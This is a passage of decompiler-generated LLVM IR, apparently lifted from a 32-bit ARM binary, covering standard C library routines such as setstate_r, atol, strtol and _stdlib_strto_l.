  %v3_f920 = sub i32 %v4_f91c, %v1_f920
  %v4_f924 = sdiv i32 %v3_f920, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_f92c = mul i32 %v4_f924, 5
  %v5_f92c = add i32 %v4_f92c, %v0_f918
  store i32 %v5_f92c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_f934 = load i32, i32* @r7, align 4
  %v2_f934 = inttoptr i32 %v1_f934 to i32*
  store i32 0, i32* %v2_f934, align 4
  %v1_f93c = load i32, i32* %r3.global-to-local, align 4
  %v2_f93c = load i32, i32* @r7, align 4
  %v3_f93c = inttoptr i32 %v2_f93c to i32*
  store i32 %v1_f93c, i32* %v3_f93c, align 4
  %v1_f970.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f968

dec_label_pc_f944:                                ; preds = %dec_label_pc_f8c4
  store i32 83740, i32* %r3.global-to-local, align 4
  %v0_f948 = call i32 @__aeabi_read_tp()
  %v3_f94c = load i16, i16* @global_var_24070.401, align 2
  %v4_f94c = sext i16 %v3_f94c to i32
  store i32 22, i32* %r2.global-to-local, align 4
  %v3_f954 = add i32 %v4_f94c, %v0_f948
  %v4_f954 = inttoptr i32 %v3_f954 to i32*
  store i32 22, i32* %v4_f954, align 4
  store i32 %v4_f94c, i32* %r3.global-to-local, align 4
  %v0_f960 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_f960, i32* %v4_f954, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f968

dec_label_pc_f968:                                ; preds = %bb27, %.thread4, %dec_label_pc_f944
  %v1_f970 = phi i32 [ %v1_f970.pre, %.thread4 ], [ %v1_f938, %bb27 ], [ -1, %dec_label_pc_f944 ]
  store i32 %v3_f88c, i32* @r4, align 4
  store i32 %v6_f88c, i32* @r5, align 4
  ret i32 %v1_f970

; uselistorder directives
  uselistorder i32 %v4_f94c, { 1, 0 }
  uselistorder i1 %v7_f8d4, { 1, 0 }
  uselistorder i1 %v7_f8ac, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32 %arg2, { 3, 4, 0, 1, 6, 5, 2, 7 }
  uselistorder label %dec_label_pc_f968, { 2, 1, 0 }
  uselistorder label %bb26, { 4, 3, 0, 1, 2 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_f984 = load i32, i32* @r4, align 4
  store i32 %v3_f984, i32* %stack_var_-24, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v1_f98c = add i32 %tmp, 12
  %v2_f98c = inttoptr i32 %v1_f98c to i8*
  %v3_f98c = load i8, i8* %v2_f98c, align 1
  %v4_f98c = zext i8 %v3_f98c to i32
  store i32 %v4_f98c, i32* %r1.global-to-local, align 4
  %v2_f990 = icmp eq i8 %v3_f98c, 0
  store i1 %v2_f990, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f990, label %.thread5, label %.thread6

.thread5:                                         ; preds = %entry
  %v1_f99812 = add i32 %arg1, 4
  store i32 %v1_f99812, i32* %r6.global-to-local, align 4
  %v1_f99c13 = add i32 %tmp, 8
  %v2_f99c14 = inttoptr i32 %v1_f99c13 to i32*
  %v3_f99c15 = load i32, i32* %v2_f99c14, align 4
  store i32 %v3_f99c15, i32* %r0.global-to-local, align 4
  %v3_f9b8 = add i32 %v3_f99c15, -4
  %v4_f9b8 = inttoptr i32 %v3_f9b8 to i32*
  store i32 %v4_f98c, i32* %v4_f9b8, align 4
  br label %bb

.thread6:                                         ; preds = %entry
  %v2_f994 = add i32 %tmp, 4
  %v3_f994 = inttoptr i32 %v2_f994 to i32*
  %v4_f994 = load i32, i32* %v3_f994, align 4
  %v1_f998 = add i32 %arg1, 4
  store i32 %v1_f998, i32* %r6.global-to-local, align 4
  %v1_f99c = add i32 %tmp, 8
  %v2_f99c = inttoptr i32 %v1_f99c to i32*
  %v3_f99c = load i32, i32* %v2_f99c, align 4
  store i32 %v3_f99c, i32* %r0.global-to-local, align 4
  %v3_f9a4 = sub i32 %v4_f994, %v3_f99c
  %v4_f9a8 = sdiv i32 %v3_f9a4, 4
  %v4_f9ac = sext i8 %v3_f98c to i32
  store i32 %v4_f9ac, i32* %r1.global-to-local, align 4
  %v4_f9b4 = mul i32 %v4_f9a8, 5
  %v5_f9b4 = add i32 %v4_f9b4, %v4_f9ac
  %v3_f9bc = add i32 %v3_f99c, -4
  %v4_f9bc = inttoptr i32 %v3_f9bc to i32*
  store i32 %v5_f9b4, i32* %v4_f9bc, align 4
  br label %bb

bb:                                               ; preds = %.thread5, %.thread6
  %v0_f9c0 = load i32, i32* %r6.global-to-local, align 4
  %v1_f9c0 = add i32 %v0_f9c0, -4
  %v2_f9c0 = inttoptr i32 %v1_f9c0 to i32*
  %v3_f9c0 = load i32, i32* %v2_f9c0, align 4
  store i32 %v3_f9c0, i32* %r8.global-to-local, align 4
  %v2_f9cc = udiv i32 %v3_f9c0, 5
  %v3_f9cc = urem i32 %v3_f9c0, 5
  store i32 %v2_f9cc, i32* %r0.global-to-local, align 4
  store i32 %v3_f9cc, i32* %r1.global-to-local, align 4
  %v2_f9d4 = icmp ugt i32 %v3_f9cc, 3
  %v7_f9d4 = icmp eq i32 %v3_f9cc, 4
  store i1 %v7_f9d4, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r5.global-to-local, align 4
  %v2_f9dc = xor i1 %v7_f9d4, true
  %v3_f9dc = and i1 %v2_f9d4, %v2_f9dc
  br i1 %v3_f9dc, label %dec_label_pc_fa44, label %dec_label_pc_f9e0

dec_label_pc_f9e0:                                ; preds = %bb
  %v4_f9e8 = mul nuw nsw i32 %v3_f9cc, 4
  %v5_f9e8 = add i32 %v4_f9e8, add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -35856)
  %v1_f9ec = add i32 %v4_f9e8, add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -35836)
  %v2_f9ec = inttoptr i32 %v1_f9ec to i32*
  %v3_f9ec = load i32, i32* %v2_f9ec, align 4
  store i32 %v3_f9ec, i32* %r5.global-to-local, align 4
  %v6_f9f0 = inttoptr i32 %v5_f9e8 to i32*
  %v7_f9f0 = load i32, i32* %v6_f9f0, align 4
  store i32 %v7_f9f0, i32* %r7.global-to-local, align 4
  %v2_f9f4 = icmp eq i32 %v3_f9cc, 0
  store i1 %v2_f9f4, i1* %cpsr_z.global-to-local, align 1
  %v1_f9f8 = trunc i32 %v3_f9ec to i8
  %v2_f9f8 = load i32, i32* %r4.global-to-local, align 4
  %v3_f9f8 = add i32 %v2_f9f8, 13
  %v4_f9f8 = inttoptr i32 %v3_f9f8 to i8*
  store i8 %v1_f9f8, i8* %v4_f9f8, align 1
  %v0_f9fc = load i32, i32* %r7.global-to-local, align 4
  %v1_f9fc = trunc i32 %v0_f9fc to i8
  %v2_f9fc = load i32, i32* %r4.global-to-local, align 4
  %v3_f9fc = add i32 %v2_f9fc, 14
  %v4_f9fc = inttoptr i32 %v3_f9fc to i8*
  store i8 %v1_f9fc, i8* %v4_f9fc, align 1
  %v0_fa00 = load i32, i32* %r1.global-to-local, align 4
  %v1_fa00 = trunc i32 %v0_fa00 to i8
  %v2_fa00 = load i32, i32* %r4.global-to-local, align 4
  %v3_fa00 = add i32 %v2_fa00, 12
  %v4_fa00 = inttoptr i32 %v3_fa00 to i8*
  store i8 %v1_fa00, i8* %v4_fa00, align 1
  %v0_fa04 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_fa04, label %dec_label_pc_fa30, label %dec_label_pc_fa08

dec_label_pc_fa08:                                ; preds = %dec_label_pc_f9e0
  %v0_fa0c = load i32, i32* %r8.global-to-local, align 4
  %v2_fa10 = sdiv i32 %v0_fa0c, 5
  store i32 %v2_fa10, i32* %r0.global-to-local, align 4
  %v0_fa14 = load i32, i32* %r6.global-to-local, align 4
  %v4_fa14 = mul i32 %v2_fa10, 4
  %v5_fa14 = add i32 %v4_fa14, %v0_fa14
  %v1_fa18 = load i32, i32* %r4.global-to-local, align 4
  %v2_fa18 = add i32 %v1_fa18, 4
  %v3_fa18 = inttoptr i32 %v2_fa18 to i32*
  store i32 %v5_fa14, i32* %v3_fa18, align 4
  %v0_fa1c = load i32, i32* %r7.global-to-local, align 4
  %v1_fa1c = load i32, i32* %r0.global-to-local, align 4
  %v2_fa1c = add i32 %v1_fa1c, %v0_fa1c
  %v0_fa20 = load i32, i32* %r5.global-to-local, align 4
  %v2_fa24 = udiv i32 %v2_fa1c, %v0_fa20
  %v3_fa24 = urem i32 %v2_fa1c, %v0_fa20
  store i32 %v2_fa24, i32* %r0.global-to-local, align 4
  %v0_fa28 = load i32, i32* %r6.global-to-local, align 4
  %v4_fa28 = mul i32 %v3_fa24, 4
  %v5_fa28 = add i32 %v0_fa28, %v4_fa28
  store i32 %v5_fa28, i32* %r1.global-to-local, align 4
  %v1_fa2c = load i32, i32* %r4.global-to-local, align 4
  %v2_fa2c = inttoptr i32 %v1_fa2c to i32*
  store i32 %v5_fa28, i32* %v2_fa2c, align 4
  br label %dec_label_pc_fa30

dec_label_pc_fa30:                                ; preds = %dec_label_pc_f9e0, %dec_label_pc_fa08
  %v0_fa30 = load i32, i32* %r6.global-to-local, align 4
  %v1_fa30 = load i32, i32* %r5.global-to-local, align 4
  %v4_fa30 = mul i32 %v1_fa30, 4
  %v5_fa30 = add i32 %v4_fa30, %v0_fa30
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_fa38 = load i32, i32* %r4.global-to-local, align 4
  %v2_fa38 = add i32 %v1_fa38, 16
  %v3_fa38 = inttoptr i32 %v2_fa38 to i32*
  store i32 %v5_fa30, i32* %v3_fa38, align 4
  %v0_fa3c = load i32, i32* %r6.global-to-local, align 4
  %v1_fa3c = load i32, i32* %r4.global-to-local, align 4
  %v2_fa3c = add i32 %v1_fa3c, 8
  %v3_fa3c = inttoptr i32 %v2_fa3c to i32*
  store i32 %v0_fa3c, i32* %v3_fa3c, align 4
  %v1_fa60.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fa5c

dec_label_pc_fa44:                                ; preds = %bb
  %v0_fa48 = call i32 @__aeabi_read_tp()
  %v3_fa4c = load i16, i16* @global_var_24070.401, align 2
  %v4_fa4c = sext i16 %v3_fa4c to i32
  %v3_fa54 = add i32 %v4_fa4c, %v0_fa48
  %v4_fa54 = inttoptr i32 %v3_fa54 to i32*
  store i32 22, i32* %v4_fa54, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fa5c

dec_label_pc_fa5c:                                ; preds = %dec_label_pc_fa30, %dec_label_pc_fa44
  %v1_fa60 = phi i32 [ %v1_fa60.pre, %dec_label_pc_fa30 ], [ -1, %dec_label_pc_fa44 ]
  %v2_fa5c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_fa5c, i32* @r4, align 4
  ret i32 %v1_fa60

; uselistorder directives
  uselistorder i32 %v0_fa20, { 1, 0 }
  uselistorder i32 %v2_fa1c, { 1, 0 }
  uselistorder i32 %v3_f9c0, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32* %r1.global-to-local, { 3, 1, 2, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 1, 2, 3, 4, 8, 9, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -35856), { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fa5c, { 1, 0 }
  uselistorder label %dec_label_pc_fa30, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_fa80 = call i32 @strtol()
  ret i32 %v0_fa80
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_fa9c = call i32 @_stdlib_strto_l()
  ret i32 %v0_fa9c
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %ip.global-to-local, align 4
  %v0_fac0 = load i32, i32* @r1, align 4
  store i32 %v0_fac0, i32* %sb.global-to-local, align 4
  %v0_fac4 = load i32, i32* @r2, align 4
  store i32 %v0_fac4, i32* %r5.global-to-local, align 4
  %v0_fac8 = load i32, i32* @r0, align 4
  store i32 %v0_fac8, i32* %r4.global-to-local, align 4
  %v0_facc = load i32, i32* @r3, align 4
  br label %dec_label_pc_fad8

dec_label_pc_fad4:                                ; preds = %dec_label_pc_fad8
  %v1_fad4 = add i32 %v0_fb10, 1
  store i32 %v1_fad4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fad8

dec_label_pc_fad8:                                ; preds = %entry, %dec_label_pc_fad4
  %v0_fb10 = phi i32 [ %v0_fac8, %entry ], [ %v1_fad4, %dec_label_pc_fad4 ]
  %v1_fad8 = inttoptr i32 %v0_fb10 to i8*
  %v2_fad8 = load i8, i8* %v1_fad8, align 1
  %v3_fad8 = zext i8 %v2_fad8 to i32
  store i32 %v3_fad8, i32* %r1.global-to-local, align 4
  %v4_fadc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 1784) to i32*), align 4
  %v2_fae0 = mul nuw nsw i32 %v3_fad8, 2
  %v2_fae4 = add i32 %v2_fae0, %v4_fadc
  %v3_fae4 = inttoptr i32 %v2_fae4 to i16*
  %v4_fae4 = load i16, i16* %v3_fae4, align 2
  %v1_fae8 = and i16 %v4_fae4, 32
  %v2_fae8 = icmp eq i16 %v1_fae8, 0
  br i1 %v2_fae8, label %dec_label_pc_faf0, label %dec_label_pc_fad4

dec_label_pc_faf0:                                ; preds = %dec_label_pc_fad8
  %v7_faf0 = icmp eq i8 %v2_fad8, 43
  br i1 %v7_faf0, label %dec_label_pc_fb10, label %dec_label_pc_faf8

dec_label_pc_faf8:                                ; preds = %dec_label_pc_faf0
  %v7_faf8 = icmp eq i8 %v2_fad8, 45
  br i1 %v7_faf8, label %dec_label_pc_fb10, label %bb

bb:                                               ; preds = %dec_label_pc_faf8
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_fb14

dec_label_pc_fb10:                                ; preds = %dec_label_pc_faf0, %dec_label_pc_faf8
  %storemerge47 = phi i32 [ 1, %dec_label_pc_faf8 ], [ 0, %dec_label_pc_faf0 ]
  store i32 %storemerge47, i32* %r7.global-to-local, align 4
  %v1_fb10 = add i32 %v0_fb10, 1
  store i32 %v1_fb10, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fb14

dec_label_pc_fb14:                                ; preds = %bb, %dec_label_pc_fb10
  %v0_fb34 = phi i32 [ %v0_fb10, %bb ], [ %v1_fb10, %dec_label_pc_fb10 ]
  %v1_fb14 = and i32 %v0_fac4, -17
  %v3_fb14 = icmp eq i32 %v1_fb14, 0
  br i1 %v3_fb14, label %dec_label_pc_fb20, label %bb60

bb60:                                             ; preds = %dec_label_pc_fb14
  br label %bb64

dec_label_pc_fb20:                                ; preds = %dec_label_pc_fb14
  %v1_fb20 = inttoptr i32 %v0_fb34 to i8*
  %v2_fb20 = load i8, i8* %v1_fb20, align 1
  %v7_fb24 = icmp eq i8 %v2_fb20, 48
  %v1_fb28 = add i32 %v0_fac4, 10
  store i32 %v1_fb28, i32* %r5.global-to-local, align 4
  br i1 %v7_fb24, label %dec_label_pc_fb34, label %bb61

bb61:                                             ; preds = %dec_label_pc_fb20
  br label %.thread8

dec_label_pc_fb34:                                ; preds = %dec_label_pc_fb20
  %v1_fb34 = add i32 %v0_fb34, 1
  %v2_fb34 = inttoptr i32 %v1_fb34 to i8*
  %v3_fb34 = load i8, i8* %v2_fb34, align 1
  %v4_fb34 = zext i8 %v3_fb34 to i32
  store i32 %v1_fb34, i32* %r4.global-to-local, align 4
  %v1_fb38 = or i32 %v4_fb34, 32
  %v7_fb3c = icmp eq i32 %v1_fb38, 120
  %v1_fb40 = add i32 %v0_fac4, 8
  store i32 %v1_fb40, i32* %r5.global-to-local, align 4
  br i1 %v7_fb3c, label %bb62, label %.thread8

bb62:                                             ; preds = %dec_label_pc_fb34
  %v3_fb4c = mul i32 %v1_fb40, 2
  store i32 %v3_fb4c, i32* %r5.global-to-local, align 4
  %v2_fb50 = add i32 %v0_fb34, 2
  store i32 %v2_fb50, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_fb34, %bb61, %bb62
  %v1_fc2430 = phi i32 [ %v0_fac8, %bb61 ], [ %v1_fb34, %bb62 ], [ %v1_fb34, %dec_label_pc_fb34 ]
  %v0_fba021 = phi i32 [ %v0_fb34, %bb61 ], [ %v2_fb50, %bb62 ], [ %v1_fb34, %dec_label_pc_fb34 ]
  %v0_fb54 = phi i32 [ %v1_fb28, %bb61 ], [ %v3_fb4c, %bb62 ], [ %v1_fb40, %dec_label_pc_fb34 ]
  %v5_fb58 = icmp slt i32 %v0_fb54, 16
  br i1 %v5_fb58, label %bb64, label %bb63

bb63:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %bb60, %.thread8, %bb63
  %v1_fc2429 = phi i32 [ %v0_fac8, %bb60 ], [ %v1_fc2430, %.thread8 ], [ %v1_fc2430, %bb63 ]
  %v0_fba020 = phi i32 [ %v0_fb34, %bb60 ], [ %v0_fba021, %.thread8 ], [ %v0_fba021, %bb63 ]
  %v0_fb80 = phi i32 [ %v0_fac4, %bb60 ], [ %v0_fb54, %.thread8 ], [ 16, %bb63 ]
  %v1_fb5c = add i32 %v0_fb80, -2
  %tmp = icmp ugt i32 %v1_fb5c, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_fb6c

.thread:                                          ; preds = %bb64
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_fc20

dec_label_pc_fb6c:                                ; preds = %bb64
  %v2_fb74 = udiv i32 -1, %v0_fb80
  %v3_fb74 = urem i32 -1, %v0_fb80
  store i32 %v0_fb80, i32* %r1.global-to-local, align 4
  %v1_fb84 = urem i32 %v3_fb74, 256
  store i32 %v1_fb84, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i32 %v2_fb74, i32* %r8.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_fba0

dec_label_pc_fb9c:                                ; preds = %bb71, %dec_label_pc_fbfc
  %v0_fb9c = phi i32 [ %v1_fbdc44, %bb71 ], [ %v0_fb9c.pre, %dec_label_pc_fbfc ]
  br label %dec_label_pc_fba0

dec_label_pc_fba0:                                ; preds = %dec_label_pc_fb6c, %dec_label_pc_fb9c
  %v1_fc2427 = phi i32 [ %v1_fc2429, %dec_label_pc_fb6c ], [ %v0_fb9c, %dec_label_pc_fb9c ]
  %v0_fbdc = phi i32 [ %v0_fba020, %dec_label_pc_fb6c ], [ %v0_fb9c, %dec_label_pc_fb9c ]
  %v1_fba0 = inttoptr i32 %v0_fbdc to i8*
  %v2_fba0 = load i8, i8* %v1_fba0, align 1
  %v3_fba0 = zext i8 %v2_fba0 to i32
  %v1_fba4 = add nsw i32 %v3_fba0, -48
  %v1_fba8 = urem i32 %v1_fba4, 256
  store i32 %v1_fba8, i32* %r1.global-to-local, align 4
  %v1_fbb0 = or i32 %v3_fba0, 32
  %tmp79 = icmp ult i32 %v1_fba8, 10
  br i1 %tmp79, label %bb66, label %dec_label_pc_fbb8

dec_label_pc_fbb8:                                ; preds = %dec_label_pc_fba0
  store i32 40, i32* %r1.global-to-local, align 4
  %tmp80 = icmp ugt i32 %v1_fbb0, 96
  br i1 %tmp80, label %bb65, label %bb66

bb65:                                             ; preds = %dec_label_pc_fbb8
  %v1_fbbc = add nsw i32 %v1_fbb0, -87
  %v5_fbc4 = urem i32 %v1_fbbc, 256
  store i32 %v5_fbc4, i32* %r1.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_fba0, %dec_label_pc_fbb8, %bb65
  %v3_fbf4 = phi i32 [ %v1_fba8, %dec_label_pc_fba0 ], [ 40, %dec_label_pc_fbb8 ], [ %v5_fbc4, %bb65 ]
  %v1_fbc8 = load i32, i32* %r5.global-to-local, align 4
  %v6_fbcc = icmp slt i32 %v3_fbf4, %v1_fbc8
  br i1 %v6_fbcc, label %dec_label_pc_fbd0, label %dec_label_pc_fc20.loopexit

dec_label_pc_fbd0:                                ; preds = %bb66
  %v0_fbd0 = load i32, i32* %ip.global-to-local, align 4
  %v1_fbd0 = load i32, i32* %r8.global-to-local, align 4
  %v9_fbd0 = icmp eq i32 %v0_fbd0, %v1_fbd0
  br i1 %v9_fbd0, label %.thread39, label %bb67

.thread39:                                        ; preds = %dec_label_pc_fbd0
  %v1_fbdc40 = add i32 %v0_fbdc, 1
  store i32 %v1_fbdc40, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fbe4

bb67:                                             ; preds = %dec_label_pc_fbd0
  %v3_fbd0 = icmp ult i32 %v0_fbd0, %v1_fbd0
  %v1_fbdc = add i32 %v0_fbdc, 1
  store i32 %v1_fbdc, i32* %r4.global-to-local, align 4
  br i1 %v3_fbd0, label %dec_label_pc_fbe4, label %dec_label_pc_fbfc

dec_label_pc_fbe4:                                ; preds = %bb67, %.thread39
  %v1_fbdc44 = phi i32 [ %v1_fbdc40, %.thread39 ], [ %v1_fbdc, %bb67 ]
  %v4_fbec2443 = phi i32 [ 1, %.thread39 ], [ 0, %bb67 ]
  %v1_fbe4 = load i32, i32* %sl.global-to-local, align 4
  %v3_fbe4 = icmp uge i32 %v3_fbf4, %v1_fbe4
  %v9_fbe4 = icmp eq i32 %v3_fbf4, %v1_fbe4
  %v2_fbe8 = xor i1 %v3_fbe4, true
  %v3_fbe8 = or i1 %v9_fbe4, %v2_fbe8
  br i1 %v3_fbe8, label %bb68, label %bb69

bb68:                                             ; preds = %dec_label_pc_fbe4
  br label %bb69

bb69:                                             ; preds = %dec_label_pc_fbe4, %bb68
  %v4_fbec = phi i32 [ %v4_fbec2443, %dec_label_pc_fbe4 ], [ 0, %bb68 ]
  %v2_fbec = xor i1 %v9_fbe4, true
  %v3_fbec = and i1 %v3_fbe4, %v2_fbec
  br i1 %v3_fbec, label %bb70, label %thread-pre-split

bb70:                                             ; preds = %bb69
  %v5_fbec = urem i32 %v4_fbec, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb69, %bb70
  %v0_fbf0 = phi i32 [ %v5_fbec, %bb70 ], [ %v4_fbec, %bb69 ]
  %v2_fbf0 = icmp eq i32 %v0_fbf0, 0
  br i1 %v2_fbf0, label %bb71, label %dec_label_pc_fbfc

bb71:                                             ; preds = %thread-pre-split
  %v4_fbf4 = mul i32 %v0_fbd0, %v1_fbc8
  %v5_fbf4 = add i32 %v4_fbf4, %v3_fbf4
  store i32 %v5_fbf4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_fb9c

dec_label_pc_fbfc:                                ; preds = %bb67, %thread-pre-split
  %v0_fc04 = call i32 @__aeabi_read_tp()
  %v0_fc08 = load i32, i32* %r7.global-to-local, align 4
  %v2_fc08 = and i32 %v0_facc, %v0_fc08
  store i32 %v2_fc08, i32* %r7.global-to-local, align 4
  %v0_fc0c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_fc0c, i32* %ip.global-to-local, align 4
  %v3_fc10 = load i16, i16* @global_var_24070.401, align 2
  %v4_fc10 = sext i16 %v3_fc10 to i32
  %v3_fc18 = add i32 %v4_fc10, %v0_fc04
  %v4_fc18 = inttoptr i32 %v3_fc18 to i32*
  store i32 34, i32* %v4_fc18, align 4
  %v0_fb9c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fb9c

dec_label_pc_fc20.loopexit:                       ; preds = %bb66
  %v0_fc20.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_fc20

dec_label_pc_fc20:                                ; preds = %.thread, %dec_label_pc_fc20.loopexit
  %v1_fc24 = phi i32 [ %v1_fc2427, %dec_label_pc_fc20.loopexit ], [ %v1_fc2429, %.thread ]
  %v2_fc24 = phi i32 [ %v0_fc20.pre, %dec_label_pc_fc20.loopexit ], [ %v0_fac0, %.thread ]
  %v2_fc20 = icmp eq i32 %v2_fc24, 0
  br i1 %v2_fc20, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_fc20
  %v3_fc24 = inttoptr i32 %v2_fc24 to i32*
  store i32 %v1_fc24, i32* %v3_fc24, align 4
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_fc20, %bb72
  %v0_fc2c = load i32, i32* %r7.global-to-local, align 4
  %v2_fc2c = icmp eq i32 %v0_fc2c, 0
  %. = select i1 %v2_fc2c, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r1.global-to-local, align 4
  %v2_fc38 = icmp eq i32 %v0_facc, 0
  %v0_fc64.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_fc38, label %dec_label_pc_fc5c, label %bb76

bb76:                                             ; preds = %bb73
  %tmp81 = icmp ugt i32 %v0_fc64.pre.pre, %.
  br i1 %tmp81, label %dec_label_pc_fc44, label %dec_label_pc_fc5c

dec_label_pc_fc44:                                ; preds = %bb76
  %v0_fc48 = call i32 @__aeabi_read_tp()
  %v3_fc4c = load i16, i16* @global_var_24070.401, align 2
  %v4_fc4c = sext i16 %v3_fc4c to i32
  %v3_fc54 = add i32 %v4_fc4c, %v0_fc48
  %v4_fc54 = inttoptr i32 %v3_fc54 to i32*
  store i32 34, i32* %v4_fc54, align 4
  %v0_fc58 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_fc58, i32* %ip.global-to-local, align 4
  %v0_fc5c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_fc5c

dec_label_pc_fc5c:                                ; preds = %bb76, %bb73, %dec_label_pc_fc44
  %v0_fc64.pre = phi i32 [ %v0_fc64.pre.pre, %bb76 ], [ %v0_fc58, %dec_label_pc_fc44 ], [ %v0_fc64.pre.pre, %bb73 ]
  %v0_fc5c = phi i32 [ %v0_fc2c, %bb76 ], [ %v0_fc5c.pre, %dec_label_pc_fc44 ], [ %v0_fc2c, %bb73 ]
  %v2_fc5c = icmp eq i32 %v0_fc5c, 0
  br i1 %v2_fc5c, label %dec_label_pc_fc5c._crit_edge, label %bb77

bb77:                                             ; preds = %dec_label_pc_fc5c
  %v2_fc60 = sub i32 0, %v0_fc64.pre
  store i32 %v2_fc60, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_fc5c._crit_edge

dec_label_pc_fc5c._crit_edge:                     ; preds = %dec_label_pc_fc5c, %bb77
  %v0_fc64 = phi i32 [ %v2_fc60, %bb77 ], [ %v0_fc64.pre, %dec_label_pc_fc5c ]
  ret i32 %v0_fc64

; uselistorder directives
  uselistorder i32 %v0_fc64.pre, { 1, 0 }
  uselistorder i32 %v0_fc64.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_fbec, { 1, 0 }
  uselistorder i1 %v3_fbe4, { 1, 0 }
  uselistorder i32 %v1_fbe4, { 1, 0 }
  uselistorder i32 %v5_fbc4, { 1, 0 }
  uselistorder i32 %v1_fbb0, { 1, 0 }
  uselistorder i32 %v1_fba8, { 2, 0, 1 }
  uselistorder i32 %v0_fbdc, { 1, 0, 2 }
  uselistorder i32 %v0_fb9c, { 1, 0 }
  uselistorder i32 %v3_fb4c, { 1, 0 }
  uselistorder i32 %v1_fb40, { 1, 0, 2 }
  uselistorder i32 %v0_fb34, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_fb10, { 0, 1, 3, 2 }
  uselistorder i32 %v0_facc, { 1, 0 }
  uselistorder i32 %v0_fac8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_fac4, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 6, 0, 7, 1, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
